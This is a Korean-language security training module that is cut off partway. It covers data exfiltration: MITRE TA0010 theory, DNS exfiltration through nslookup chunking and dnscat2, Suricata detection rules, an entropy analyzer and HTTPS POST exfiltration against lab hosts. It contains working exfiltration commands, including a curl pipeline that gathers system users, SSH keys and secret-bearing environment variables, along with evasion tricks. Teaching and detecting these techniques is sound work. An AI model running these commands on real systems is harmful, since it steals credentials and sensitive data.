# Week 05: 데이터 유출 기법 — DNS Exfiltration, HTTPS Tunnel, 스테가노그래피

---

## 학습 목표

1. 데이터 유출(Exfiltration)의 킬체인 내 위치와 MITRE ATT&CK TA0010 전술 체계를 완전히 이해한다
2. DNS 프로토콜을 악용한 데이터 유출 기법(iodine, dnscat2, 수동 인코딩)을 직접 구현하고 원리를 설명할 수 있다
3. HTTPS 암호화 터널을 통한 은닉 데이터 유출 기법을 실습하고 TLS 검사 우회 메커니즘을 이해한다
4. 스테가노그래피(steghide, exiftool, LSB 삽입)를 이용한 데이터 은닉 및 추출 기법을 익힌다
5. 각 유출 채널별 네트워크/호스트 기반 탐지 기법과 시그니처를 작성할 수 있다
6. DLP(Data Loss Prevention) 정책 수립, DNS 트래픽 이상 분석, NetFlow 기반 탐지 전략을 설계할 수 있다
7. OpsClaw 플랫폼을 활용한 자동화된 유출 탐지 파이프라인을 구성할 수 있다

---

## 전제 조건

- 공방전 기초 과정(course11) 이수 완료
- Week 03 C2 채널 구축 실습 완료 (DNS Tunneling 기본 개념 이해)
- 네트워크 프로토콜(TCP/IP, DNS, HTTP/HTTPS) 분석 기초 지식
- Linux 명령줄 환경에서 tcpdump, Wireshark, curl, nslookup 사용 경험
- Base64, Hex 등 기본 인코딩 개념 이해
- Python 3 기초 프로그래밍 능력 (스크립트 작성 및 실행)

---

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 유출 수신 서버 (C2/Exfil Receiver) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 네트워크 모니터링/DLP/nftables 방화벽 | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 감염 호스트 (유출 출발지, 공격자 거점) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | Wazuh SIEM 탐지 및 경보 수집 | `sshpass -p1 ssh siem@10.20.30.100` |

---

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 | 비고 |
|------|------|------|------|
| 0:00 - 0:40 | Part 1: 데이터 유출 이론 | 강의 | TA0010 전술 체계, 채널 분류 |
| 0:40 - 1:20 | Part 2: DNS Exfiltration 실습 | 실습 | iodine/dnscat2, 수동 인코딩 |
| 1:20 - 1:30 | 휴식 | - | - |
| 1:30 - 2:10 | Part 3: HTTPS/스테가노그래피 실습 | 실습 | HTTPS 터널, steghide, exiftool |
| 2:10 - 2:20 | 휴식 | - | - |
| 2:20 - 2:40 | Part 4: 유출 탐지 및 방지 | 강의+실습 | DLP, DNS 분석, NetFlow, OpsClaw |
| 2:40 - 3:00 | 자가 점검 퀴즈 + 과제 안내 | 평가 | 10문항 퀴즈, 과제 설명 |

---

# Part 1: 데이터 유출 이론 (40분)

## 1.1 데이터 유출(Exfiltration)이란?

데이터 유출은 공격자가 목표 네트워크에서 **수집한 민감 정보를 외부로 반출**하는 공격 행위이다. MITRE ATT&CK 킬체인에서 마지막에 가까운 단계(TA0010)에 해당하며, 공격의 최종 목표 달성을 의미한다.

### 킬체인 내 위치

```
초기 접근(TA0001) → 실행(TA0002) → 지속성(TA0003) → 권한 상승(TA0004)
  → 방어 회피(TA0005) → 자격증명(TA0006) → 탐색(TA0007)
  → 횡이동(TA0008) → 수집(TA0009) → ★ 유출(TA0010) ★ → 영향(TA0040)
```

유출 단계에 도달했다는 것은 공격자가 이미 충분한 권한과 네트워크 접근성을 확보했음을 의미한다. 따라서 유출 탐지는 **최후 방어선**으로서 매우 중요하다.

### 유출 동기 분류

| 유형 | 목표 데이터 | 유출 특성 |
|------|------------|----------|
| 산업 스파이 | 설계도, 소스코드, 영업비밀 | 대용량, 지속적, 은닉 중시 |
| 랜섬웨어 이중 협박 | 고객 DB, 내부 문서 | 빠른 대량 유출 |
| APT/국가 지원 | 군사/정부 기밀 | 장기간, 소량, 고도 은닉 |
| 내부자 위협 | 고객 정보, 인사 기록 | 정상 채널 악용 |
| 핵티비즘 | 내부 이메일, 부정 증거 | 공개 목적, 빠른 유출 |

## 1.2 MITRE ATT&CK Exfiltration 전술 (TA0010) 상세

TA0010은 데이터 유출에 사용되는 기법들을 체계적으로 분류한다. 각 기법의 특성과 실제 APT 그룹 사용 사례를 이해하는 것이 중요하다.

| 기법 ID | 기법명 | 설명 | 채널 유형 | 은닉성 | 대역폭 | 실제 사용 APT |
|---------|--------|------|----------|--------|--------|--------------|
| T1048.001 | 대칭 암호화 비-C2 채널 | 별도 암호화 채널로 유출 | 암호화 | 상 | 중 | APT29, FIN7 |
| T1048.002 | 비대칭 암호화 비-C2 채널 | 공개키 암호화 채널 | 암호화 | 상 | 중 | APT28 |
| T1048.003 | 비암호화 비-C2 채널 | 평문 FTP/HTTP 등 | 평문 | 하 | 상 | Lazarus |
| T1041 | C2 채널을 통한 유출 | 기존 C2 인프라 재사용 | C2 | 중 | 중 | 대부분의 APT |
| T1567.001 | 코드 저장소로 유출 | GitHub/GitLab 등 | 클라우드 | 상 | 중 | LAPSUS$ |
| T1567.002 | 클라우드 스토리지로 유출 | S3/GDrive/OneDrive 등 | 클라우드 | 상 | 상 | APT41 |
| T1567.003 | 웹 서비스로 유출 | Slack/Telegram/Pastebin | 웹 | 상 | 중 | MuddyWater |
| T1537 | 클라우드 계정으로 전송 | 공격자 클라우드 계정 | 클라우드 | 상 | 상 | APT33 |
| T1029 | 스케줄 전송 | 시간 기반 분할 유출 | 혼합 | 중 | 하 | APT1 |
| T1030 | 데이터 크기 제한 전송 | 소량씩 분할 유출 | 혼합 | 상 | 하 | Turla |
| T1052 | 물리 매체를 통한 유출 | USB, 외장 HDD | 물리 | - | 상 | 내부자 |
| T1011 | 다른 네트워크를 통한 유출 | 무선/블루투스/모바일 | 물리 | 상 | 중 | DarkHotel |

## 1.3 유출 채널 분류 및 비교

### 프로토콜별 채널 특성

```
[대역폭]    HTTPS(수 MB/s) > FTP(수 MB/s) > ICMP(수 KB/s) > DNS(수백 B/s)
[은닉성]    DNS > ICMP > HTTPS(TLS 내부) > FTP(평문)
[탐지 난이도] 스테가노그래피 > DNS > HTTPS(TLS) > 평문 전송
[구현 복잡도] DNS > 스테가노 > HTTPS > 평문 HTTP
[방화벽 우회] DNS(포트 53 거의 항상 허용) > HTTPS(443) > ICMP > FTP
```

### 채널별 상세 비교표

| 채널 | 포트 | 암호화 | 대역폭 | 은닉성 | 방화벽 우회 | DLP 탐지 |
|------|------|--------|--------|--------|-----------|----------|
| DNS | 53/UDP | 없음(DoH 제외) | 매우 낮음(~500 B/s) | 매우 높음 | 거의 항상 통과 | 어려움 |
| HTTPS | 443/TCP | TLS 1.2/1.3 | 높음(수 MB/s) | 높음 | 거의 항상 통과 | TLS 검사 필요 |
| ICMP | - | 없음 | 낮음(~1 KB/s) | 높음 | 일부 차단 가능 | 페이로드 검사 필요 |
| HTTP | 80/TCP | 없음 | 높음 | 낮음 | 통과 | DPI로 가능 |
| FTP | 21/TCP | 없음(FTPS 제외) | 높음 | 낮음 | 자주 차단 | 용이 |
| 클라우드 API | 443/TCP | TLS | 매우 높음 | 매우 높음 | 정상 트래픽으로 위장 | 매우 어려움 |
| 스테가노그래피 | 다양 | 커버 미디어 내 은닉 | 낮음 | 최고 수준 | 탐지 거의 불가 | 전문 도구 필요 |

### 클라우드 서비스 기반 유출의 위험성

최근 공격자들은 합법적인 클라우드 서비스(Google Drive, OneDrive, Slack, Telegram)를 유출 채널로 악용한다. 정상 업무 트래픽과 구분 불가, TLS 암호화로 콘텐츠 검사 불가, 업무용 도메인 차단 불가 등의 이유로 탐지가 매우 어렵다.

## 1.4 DLP(Data Loss Prevention) 개요

| 유형 | 위치 | 장점 | 한계 |
|------|------|------|------|
| 네트워크 DLP | 인라인/미러링 | 실시간 차단 | 암호화 우회 |
| 엔드포인트 DLP | 에이전트 | 오프라인도 동작 | 에이전트 비활성화 가능 |
| 클라우드 DLP | CASB/API | 클라우드 가시성 | 새 서비스 대응 지연 |

DLP 탐지 기법: 키워드 매칭, 정규표현식(`\d{6}-[1-4]\d{6}` 주민번호 등), 문서 핑거프린트, 머신러닝 이상 탐지, 컨텍스트 분석(발신자/수신자/시간/크기)

---

# Part 2: DNS Exfiltration 실습 (40분)

## 2.1 DNS Exfiltration 원리

DNS는 거의 모든 네트워크에서 허용되는 프로토콜이다. 공격자는 DNS 쿼리의 서브도메인 부분이나 TXT 레코드에 데이터를 인코딩하여 유출한다.

### DNS 쿼리 구조와 데이터 인코딩

```
정상 DNS 쿼리:
  www.example.com → A 레코드 질의

악의적 DNS 쿼리 (데이터 인코딩):
  Q09ORklERU5USUFM.exfil.attacker.com → 서브도메인에 Base64 데이터 삽입
  |                  |
  +- 유출 데이터      +- 공격자 도메인
```

### DNS 프로토콜 제약

- 레이블(서브도메인 한 세그먼트) 최대 길이: **63바이트**
- 전체 도메인 이름 최대 길이: **253바이트**
- UDP 페이로드 기본 최대: **512바이트** (EDNS0으로 확장 가능)
- Base64 인코딩 시 실질 데이터: **약 45바이트/쿼리**

### iodine과 dnscat2 비교

| 도구 | 유형 | 프로토콜 | 특징 | 탐지 용이성 |
|------|------|---------|------|-----------|
| iodine | IP-over-DNS 터널 | NULL/TXT/CNAME | IP 레벨 터널링, 높은 대역폭 | 중간 (지속적 쿼리) |
| dnscat2 | 암호화 C2+Exfil | TXT/CNAME/MX | 세션 관리, 파일 전송 내장 | 낮음 (암호화) |
| 수동 스크립트 | 데이터 인코딩 | A/TXT/CNAME | 커스텀, 도구 시그니처 없음 | 낮음 (패턴 가변적) |

## 실습 2.1: DNS 쿼리를 이용한 수동 파일 유출

> **실습 목적**: DNS A 레코드 쿼리의 서브도메인 필드에 데이터를 Base64 인코딩하여 삽입하고, 수신 측에서 DNS 쿼리를 캡처하여 원본 데이터를 복원한다. DNS 유출의 가장 기본적인 원리를 이해한다.
>
> **배우는 것**: DNS 프로토콜의 구조적 특성이 데이터 유출에 어떻게 악용되는지, Base64 인코딩과 DNS 레이블 길이 제한의 관계, tcpdump를 이용한 DNS 패킷 캡처 방법을 학습한다.
>
> **결과 해석**: 수신 서버에서 캡처된 DNS 쿼리 로그에서 서브도메인 부분을 추출하고 Base64 디코딩하면 원본 데이터가 복원된다. 이는 DNS가 방화벽을 통과할 수 있는 특성상 매우 위험한 유출 경로임을 입증한다.
>
> **실전 활용**: 보안 관제 시 DNS 쿼리의 서브도메인 길이가 비정상적으로 긴 경우(40자 이상), Base64 패턴이 포함된 경우를 탐지 규칙으로 설정하여 DNS 유출 시도를 조기에 발견할 수 있다.
>
> **명령어 해설**: 아래 각 단계의 명령어에 대한 상세 설명을 해당 코드 블록 이후에 기술한다.
>
> **트러블슈팅**: 각 단계에서 발생 가능한 오류와 해결 방법을 코드 블록 이후에 기술한다.

### 1단계: 유출 데이터 준비 (web 서버)

```bash
# web 서버에 접속
sshpass -p1 ssh web@10.20.30.80

# 유출할 테스트 민감 데이터 생성
cat > /tmp/secret_data.txt << 'EOF'
CONFIDENTIAL DOCUMENT
Employee: Kim Minjun
SSN: 900101-1234567
Salary: 85,000,000 KRW
Bank Account: 110-123-456789
Password: S3cur3_P@ss_2026!
Project Codename: Phoenix
EOF

# 파일 크기 확인
wc -c /tmp/secret_data.txt
# 기대 출력: 약 200 bytes

# Base64 인코딩 (DNS 서브도메인 레이블 최대 63자 제한 적용)
cat /tmp/secret_data.txt | base64 -w 0 | fold -w 60 > /tmp/secret_b64_chunks.txt
cat -n /tmp/secret_b64_chunks.txt
# 기대 출력:
#   1  Q09ORklERU5USUFMIERPQtVNRU5UCkVtcGxveWVlOiBLaW0gTWluanVu
#   2  ClNTTjogOTAwMTAxLTEyMzQ1NjcKU2FsYXJ5OiA4NSwwMDAsMDAwIEtS
#   3  VwpCYW5rIEFjY291bnQ6IDExMC0xMjMtNDU2Nzg5ClBhc3N3b3JkOiBT
#   4  M2N1cjNfUEBzc18yMDI2IQpQcm9qZWN0IENvZGVuYW1lOiBQaG9lbml4
#   5  Cg==
```

> **명령어 해설**:
> - `base64 -w 0`: 줄바꿈 없이 한 줄로 Base64 인코딩
> - `fold -w 60`: 60자마다 줄바꿈 (DNS 레이블 63자 제한보다 약간 여유를 둠)
> - 각 줄이 하나의 DNS 쿼리로 전송됨

### 2단계: DNS 수신 서버 준비 (opsclaw 서버)

```bash
# opsclaw 서버에서 DNS 쿼리 캡처 시작 (별도 터미널)
sudo tcpdump -i any -n 'udp port 53' -l 2>/dev/null | \
  tee /tmp/dns_capture.log | \
  grep --line-buffered -oP '[A-Za-z0-9+/=]{10,}(?=\.[0-9]+\.exfil)' | \
  while read chunk; do
    echo "[캡처] 청크: ${chunk:0:30}..."
  done

# 기대 출력: 실시간으로 DNS 쿼리의 서브도메인 데이터가 표시됨
```

### 3단계: DNS 쿼리로 데이터 유출 실행 (web 서버)

```bash
# web 서버에서 DNS 쿼리를 통해 데이터를 순차적으로 유출
SEQ=0
cat /tmp/secret_b64_chunks.txt | while read line; do
  SEQ=$((SEQ + 1))
  # 서브도메인 형식: {Base64데이터}.{시퀀스번호}.exfil.lab.local
  nslookup "${line}.${SEQ}.exfil.lab.local" 10.20.30.201 > /dev/null 2>&1
  echo "[유출] 청크 ${SEQ}: ${line:0:30}..."
  sleep 0.3  # 탐지 회피를 위한 지연
done

echo "[완료] 총 ${SEQ}개 청크 유출 완료"

# 기대 출력:
# [유출] 청크 1: Q09ORklERU5USUFMIERPQtVNR...
# [유출] 청크 2: ClNTTjogOTAwMTAxLTEyMzQ1Nj...
# [유출] 청크 3: VwpCYW5rIEFjY291bnQ6IDExMC...
# [유출] 청크 4: M2N1cjNfUEBzc18yMDI2IQpQcm...
# [유출] 청크 5: Cg==...
# [완료] 총 5개 청크 유출 완료
```

> **명령어 해설**:
> - `nslookup`: DNS 질의를 수행하는 기본 도구. 서브도메인에 데이터가 포함됨
> - `sleep 0.3`: 짧은 간격으로 쿼리를 분산하여 버스트 탐지를 우회
> - 시퀀스 번호로 수신 측에서 올바른 순서로 재조립 가능

### 4단계: 수신 데이터 복원 (opsclaw 서버)

```bash
# 캡처된 DNS 로그에서 데이터 추출 및 복원
grep -oP '[A-Za-z0-9+/=]{10,}(?=\.[0-9]+\.exfil)' /tmp/dns_capture.log | \
  tr -d '\n' | base64 -d > /tmp/recovered_secret.txt

# 복원된 데이터 확인
cat /tmp/recovered_secret.txt
# 기대 출력:
# CONFIDENTIAL DOCUMENT
# Employee: Kim Minjun
# SSN: 900101-1234567
# ...

# 원본과 비교
diff /tmp/secret_data.txt /tmp/recovered_secret.txt && echo "일치: 유출 성공" || echo "불일치: 데이터 손실 발생"
```

> **트러블슈팅**:
> - `nslookup` 명령이 실패하는 경우: `dig` 명령으로 대체 (`dig @10.20.30.201 "${line}.${SEQ}.exfil.lab.local" A +short`)
> - tcpdump 권한 오류: `sudo`를 사용하거나 사용자를 `pcap` 그룹에 추가
> - Base64 디코딩 오류: DNS 레이블에서 `+`, `/`, `=` 문자가 손상될 수 있음. Base32 인코딩으로 대체하면 안전함 (`base32 -w 0`으로 인코딩, 대소문자 구분 없음)
> - 데이터가 불완전한 경우: 시퀀스 번호를 확인하여 누락된 청크를 재전송

## 실습 2.2: dnscat2를 활용한 고급 DNS 유출

> **실습 목적**: dnscat2를 이용하여 암호화된 DNS 터널을 구성하고, 내장된 파일 전송 기능으로 대량 데이터를 유출한다. 도구 기반 DNS 유출의 효율성과 위험성을 체험한다.
>
> **배우는 것**: dnscat2의 아키텍처(서버-클라이언트 모델), DNS 터널을 통한 암호화 통신 원리, 세션 기반 파일 전송 메커니즘을 학습한다.
>
> **결과 해석**: dnscat2 세션이 수립되면 DNS 쿼리만으로 양방향 암호화 통신이 가능해진다. 전송된 파일은 서버 측에서 완전한 형태로 수신되며, 일반적인 DNS 모니터링으로는 콘텐츠를 확인할 수 없다.
>
> **실전 활용**: dnscat2 트래픽의 특징(높은 빈도의 TXT 쿼리, 비정상적 엔트로피, 특정 도메인에 대한 반복 쿼리)을 파악하여 IDS/IPS 시그니처를 작성한다.

### 서버 설정 (opsclaw)

```bash
# dnscat2 서버 실행
cd /opt/dnscat2/server
ruby dnscat2.rb --dns "domain=exfil.lab.local,host=0.0.0.0" --no-cache

# 기대 출력:
# New window created: 0
# dnscat2> Starting Dnscat2 DNS server on 0.0.0.0:53
# [domains = exfil.lab.local]
# Assuming you have an authoritative DNS server, you can run
# the client anywhere with the following:
#   ./dnscat --dns domain=exfil.lab.local
#
# To talk directly to the server without a domain name, run:
#   ./dnscat --dns host=10.20.30.201,port=53
#
# Waiting for connections...
```

### 클라이언트 실행 및 파일 유출 (web)

```bash
# dnscat2 클라이언트로 서버에 연결
/opt/dnscat2/client/dnscat --dns "domain=exfil.lab.local,server=10.20.30.201"

# 기대 출력:
# Creating DNS driver:
#  domain = exfil.lab.local
#  host   = 10.20.30.201
#  port   = 53
# Session established!
```

```bash
# dnscat2 서버에서 세션 확인 및 파일 다운로드 명령
# (opsclaw의 dnscat2 콘솔에서)
dnscat2> sessions
# 기대 출력:
#   command (web) :: command session
#     0 :: command session

dnscat2> session -i 0

# 원격 파일 다운로드 (유출)
command (web)> download /etc/passwd /tmp/exfil_passwd.txt
# 기대 출력:
# Downloading /etc/passwd to /tmp/exfil_passwd.txt
# [download] 100% complete

command (web)> download /tmp/secret_data.txt /tmp/exfil_secret.txt
# 기대 출력:
# Downloading /tmp/secret_data.txt to /tmp/exfil_secret.txt
```

> **명령어 해설**:
> - `--dns "domain=..."`: DNS 터널링에 사용할 도메인 지정
> - `--no-cache`: DNS 캐시를 비활성화하여 모든 쿼리가 서버에 도달하도록 함
> - `download`: dnscat2 내장 파일 전송 명령. DNS 쿼리/응답만으로 파일을 전송
>
> **트러블슈팅**:
> - 연결 실패 시: `--dns "host=10.20.30.201,port=53"` 으로 직접 연결 시도
> - 속도가 매우 느린 경우: DNS 쿼리 간격이 기본값으로 설정되어 있음. `set max_poll_interval=100` 으로 단축 가능
> - Ruby 의존성 오류: `bundle install` 또는 `gem install bundler` 실행
> - 포트 53 충돌: 기존 DNS 서비스(systemd-resolved 등) 중지 필요 (`sudo systemctl stop systemd-resolved`)

## 실습 2.3: DNS 유출 탐지 실습 (secu 서버)

> **실습 목적**: DNS 유출 트래픽의 특징을 분석하고, Suricata 규칙과 스크립트 기반으로 탐지하는 방법을 학습한다.
>
> **배우는 것**: DNS 유출 트래픽의 통계적 특성(쿼리 길이, 빈도, 엔트로피), Suricata DNS 키워드를 활용한 탐지 규칙 작성법을 학습한다.
>
> **결과 해석**: 정상 DNS 트래픽과 비교하여 유출 트래픽은 서브도메인 길이가 비정상적으로 길고, 쿼리 빈도가 높으며, 엔트로피(무작위성)가 높다. 이러한 특징을 기반으로 탐지 규칙을 작성할 수 있다.
>
> **실전 활용**: SOC 환경에서 DNS 쿼리 모니터링 대시보드를 구성하고, 서브도메인 길이 임계값(40자 이상), 단일 도메인에 대한 비정상적 쿼리 빈도(분당 30회 이상)를 경보 조건으로 설정한다.

```bash
# secu 서버에 접속
sshpass -p1 ssh secu@10.20.30.1

# Suricata DNS 유출 탐지 규칙 작성
cat > /tmp/dns_exfil_detect.rules << 'RULES'
# 규칙 1: 비정상적으로 긴 DNS 서브도메인 (40자 이상 Base64 패턴)
alert dns any any -> any any (msg:"DNS Exfil - Long Base64 subdomain detected"; \
  dns.query; pcre:"/^[A-Za-z0-9+\/=]{40,}\./"; \
  threshold:type both, track by_src, count 5, seconds 60; \
  classtype:policy-violation; sid:3000001; rev:1;)

# 규칙 2: 단일 도메인에 대한 고빈도 DNS 쿼리
alert dns any any -> any any (msg:"DNS Exfil - High frequency queries to single domain"; \
  dns.query; content:".exfil."; nocase; \
  threshold:type threshold, track by_src, count 30, seconds 60; \
  classtype:policy-violation; sid:3000002; rev:1;)

# 규칙 3: TXT 레코드 대량 질의 (dnscat2 특징)
alert dns any any -> any any (msg:"DNS Exfil - Excessive TXT queries (possible dnscat2)"; \
  dns.query; content:"|00 10|"; \
  threshold:type both, track by_src, count 20, seconds 30; \
  classtype:trojan-activity; sid:3000003; rev:1;)

# 규칙 4: DNS 쿼리 이름에 높은 엔트로피 (hex-like 패턴)
alert dns any any -> any any (msg:"DNS Exfil - High entropy hex subdomain"; \
  dns.query; pcre:"/^[0-9a-f]{32,}\./i"; \
  threshold:type both, track by_src, count 3, seconds 60; \
  classtype:policy-violation; sid:3000004; rev:1;)
RULES

echo "[완료] 탐지 규칙 4개 작성됨"

# 규칙 검증 (구문 오류 확인)
suricata -T -c /etc/suricata/suricata.yaml -S /tmp/dns_exfil_detect.rules 2>&1 | tail -3
# 기대 출력:
# ...
# Configuration provided was successfully loaded. Exiting.
```

```bash
# Python 기반 DNS 쿼리 길이 통계 분석 스크립트
cat > /tmp/dns_entropy_analyzer.py << 'PYEOF'
#!/usr/bin/env python3
"""DNS 쿼리 서브도메인 엔트로피 및 길이 분석기"""
import math
import sys
from collections import Counter

def shannon_entropy(s):
    """문자열의 Shannon 엔트로피 계산"""
    if not s:
        return 0.0
    freq = Counter(s)
    length = len(s)
    return -sum((c/length) * math.log2(c/length) for c in freq.values())

def analyze_dns_log(logfile):
    """DNS 로그에서 서브도메인을 추출하여 분석"""
    suspicious = []
    with open(logfile) as f:
        for line in f:
            # tcpdump 출력에서 쿼리 도메인 추출
            parts = line.split()
            for p in parts:
                if '.exfil.' in p or '.lab.local' in p:
                    subdomain = p.split('.')[0]
                    entropy = shannon_entropy(subdomain)
                    length = len(subdomain)
                    if length > 30 and entropy > 3.5:
                        suspicious.append({
                            'subdomain': subdomain[:40],
                            'length': length,
                            'entropy': round(entropy, 2)
                        })
    
    print(f"\n=== DNS 유출 의심 쿼리 분석 결과 ===")
    print(f"총 의심 쿼리: {len(suspicious)}개")
    print(f"{'서브도메인':40s} {'길이':>6s} {'엔트로피':>8s}")
    print("-" * 58)
    for s in suspicious[:20]:
        print(f"{s['subdomain']:40s} {s['length']:6d} {s['entropy']:8.2f}")
    
    if suspicious:
        avg_len = sum(s['length'] for s in suspicious) / len(suspicious)
        avg_ent = sum(s['entropy'] for s in suspicious) / len(suspicious)
        print(f"\n평균 길이: {avg_len:.1f}자, 평균 엔트로피: {avg_ent:.2f}")
        print("판정: DNS Exfiltration 강력 의심" if avg_ent > 4.0 else "판정: 추가 조사 필요")

if __name__ == '__main__':
    analyze_dns_log(sys.argv[1] if len(sys.argv) > 1 else '/tmp/dns_capture.log')
PYEOF

python3 /tmp/dns_entropy_analyzer.py /tmp/dns_capture.log
# 기대 출력:
# === DNS 유출 의심 쿼리 분석 결과 ===
# 총 의심 쿼리: 5개
# 서브도메인                                  길이   엔트로피
# ----------------------------------------------------------
# Q09ORklERU5USUFMIERPQtVNRU5UCkVtcGxv      60     4.52
# ClNTTjogOTAwMTAxLTEyMzQ1NjcKU2FsYXJ5      60     4.38
# ...
# 판정: DNS Exfiltration 강력 의심
```

> **트러블슈팅**:
> - tcpdump 로그 파일이 비어 있는 경우: 인터페이스 이름 확인 (`ip link show`), `-i any`로 모든 인터페이스 캡처
> - Suricata 규칙 로드 실패: PCRE 패턴의 이스케이프 문자 확인, `/` 앞에 `\` 추가 필요
> - 엔트로피 분석 스크립트 오류: Python 3.6 이상 필요, `math.log2` 함수 확인

---

# Part 3: HTTPS/스테가노그래피 실습 (40분)

## 3.1 HTTPS Covert Channel 원리

HTTPS 트래픽은 TLS로 암호화되어 있어 내용 검사가 어렵다. 공격자는 이를 악용하여 정상적인 웹 트래픽에 데이터를 숨겨 유출한다.

### HTTPS 유출 기법 분류

| 기법 | 설명 | 탐지 난이도 |
|------|------|-----------|
| POST Body 직접 전송 | 암호화된 HTTPS POST에 데이터 포함 | TLS 검사 필요 |
| HTTP 헤더 인코딩 | Cookie, User-Agent 등에 데이터 삽입 | 매우 어려움 |
| DNS over HTTPS (DoH) | DoH 프로토콜로 DNS 유출 | 매우 어려움 |
| 클라우드 API 위장 | 정상 API 호출에 데이터 삽입 | 거의 불가 |
| WebSocket 터널 | 지속 연결로 스트리밍 유출 | 세션 분석 필요 |

## 실습 3.1: HTTPS POST를 통한 데이터 유출

> **실습 목적**: 자체 서명 인증서를 사용한 HTTPS 서버를 구축하고, 암호화된 POST 요청을 통해 민감 데이터를 유출한다. TLS 암호화가 DLP 우회에 어떻게 활용되는지 이해한다.
>
> **배우는 것**: OpenSSL을 이용한 자체 서명 인증서 생성, Python HTTPS 서버 구축, curl을 통한 암호화 데이터 전송, TLS 트래픽의 DLP 우회 특성을 학습한다.
>
> **결과 해석**: TLS 암호화된 트래픽은 네트워크 DLP가 콘텐츠를 검사할 수 없다. 패킷 캡처에서도 암호화된 페이로드만 보이며, 민감 데이터 패턴(주민번호, 비밀번호 등)을 탐지할 수 없다. 이는 TLS 검사(SSL Inspection) 없이는 HTTPS 유출을 탐지할 수 없음을 보여준다.
>
> **실전 활용**: 기업 환경에서 SSL Inspection 프록시(Squid, Zscaler 등)를 배치하여 TLS 트래픽 내용을 검사하되, 인증서 피닝을 사용하는 애플리케이션과의 호환성 문제를 고려해야 한다.

### 1단계: HTTPS 수신 서버 구축 (opsclaw)

```bash
# 자체 서명 인증서 생성
openssl req -x509 -newkey rsa:2048 -keyout /tmp/exfil_key.pem -out /tmp/exfil_cert.pem \
  -days 1 -nodes -subj "/CN=exfil.lab.local"
# 기대 출력:
# Generating a RSA private key
# writing new private key to '/tmp/exfil_key.pem'
# -----

# HTTPS 유출 수신 서버 시작
cat > /tmp/https_exfil_server.py << 'PYEOF'
#!/usr/bin/env python3
"""HTTPS Exfiltration 수신 서버"""
import ssl
import json
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

RECV_DIR = "/tmp/exfil_received"
os.makedirs(RECV_DIR, exist_ok=True)

class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        
        # 메타데이터 기록
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filepath = f"{RECV_DIR}/{timestamp}_{length}bytes.bin"
        
        with open(filepath, 'wb') as f:
            f.write(data)
        
        # 헤더 정보 로깅 (유출 출처 분석용)
        ua = self.headers.get('User-Agent', 'Unknown')
        ct = self.headers.get('Content-Type', 'Unknown')
        src = self.client_address[0]
        
        print(f"[{timestamp}] 수신: {length:,} bytes from {src}")
        print(f"  Content-Type: {ct}")
        print(f"  User-Agent: {ua}")
        print(f"  저장: {filepath}")
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode())
    
    def log_message(self, format, *args):
        pass  # 기본 로그 억제

context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('/tmp/exfil_cert.pem', '/tmp/exfil_key.pem')

server = HTTPServer(('0.0.0.0', 8443), ExfilHandler)
server.socket = context.wrap_socket(server.socket, server_side=True)

print("=" * 50)
print("HTTPS Exfil 수신 서버 시작 (포트 8443)")
print(f"수신 디렉토리: {RECV_DIR}")
print("=" * 50)
server.serve_forever()
PYEOF

python3 /tmp/https_exfil_server.py &
# 기대 출력:
# ==================================================
# HTTPS Exfil 수신 서버 시작 (포트 8443)
# 수신 디렉토리: /tmp/exfil_received
# ==================================================
```

### 2단계: 데이터 유출 실행 (web 서버)

```bash
# web 서버에서 HTTPS를 통한 데이터 유출
sshpass -p1 ssh web@10.20.30.80

# 방법 1: 단일 파일 유출 (tar.gz 압축)
tar czf - /tmp/secret_data.txt 2>/dev/null | \
  curl -k -X POST \
  -H "Content-Type: application/octet-stream" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  --data-binary @- \
  https://10.20.30.201:8443/api/analytics
# 기대 출력: {"status": "ok"}

# 방법 2: 시스템 정보 + 인증정보 수집 후 유출
{
  echo "=== 호스트 정보 ==="
  hostname && uname -a
  echo "=== 네트워크 ==="
  ip addr show | grep "inet "
  echo "=== 사용자 목록 ==="
  cat /etc/passwd | grep -v nologin
  echo "=== SSH 키 ==="
  find /home -name "authorized_keys" -exec cat {} \; 2>/dev/null
  echo "=== 환경변수 (비밀 포함 가능) ==="
  env | grep -iE "(pass|key|secret|token)"
} | gzip | \
  curl -k -s -X POST \
  -H "Content-Type: application/gzip" \
  -H "X-Request-ID: $(uuidgen)" \
  --data-binary @- \
  https://10.20.30.201:8443/api/telemetry

echo "[유출 완료] 시스템 정보 전송"
# 기대 출력:
# {"status": "ok"}
# [유출 완료] 시스템 정보 전송

# 방법 3: HTTP 헤더에 소량 데이터 숨김 (Cookie 위장)
SECRET=$(cat /tmp/secret_data.txt | base64 -w 0)
curl -k -s -X GET \
  -H "Cookie: session=${SECRET}; analytics=true" \
  -H "User-Agent: Mozilla/5.0 (compatible)" \
  https://10.20.30.201:8443/api/check
```

> **명령어 해설**:
> - `curl -k`: 자체 서명 인증서 검증 건너뜀 (실환경에서는 공격자가 유효한 인증서 사용)
> - `--data-binary @-`: stdin의 바이너리 데이터를 그대로 전송
> - `User-Agent` 위장: 정상 브라우저처럼 보이도록 헤더 조작
> - `gzip` 압축: 전송 크기 감소 및 DLP 패턴 매칭 우회
> - `X-Request-ID`: 정상 API 요청처럼 위장
>
> **트러블슈팅**:
> - `curl: (35) SSL connect error`: 서버의 TLS 버전 확인. `--tls-max 1.2` 옵션 추가
> - `Connection refused`: 서버 포트(8443) 방화벽 확인 (`nftables list ruleset | grep 8443`)
> - 대용량 파일 유출 시 타임아웃: `curl --connect-timeout 30 --max-time 300` 설정
> - 수신 데이터 깨짐: Content-Type 헤더와 실제 데이터 형식 일치 확인

### 3단계: TLS 트래픽 분석 확인 (secu 서버)

```bash
# secu 서버에서 TLS 트래픽 캡처
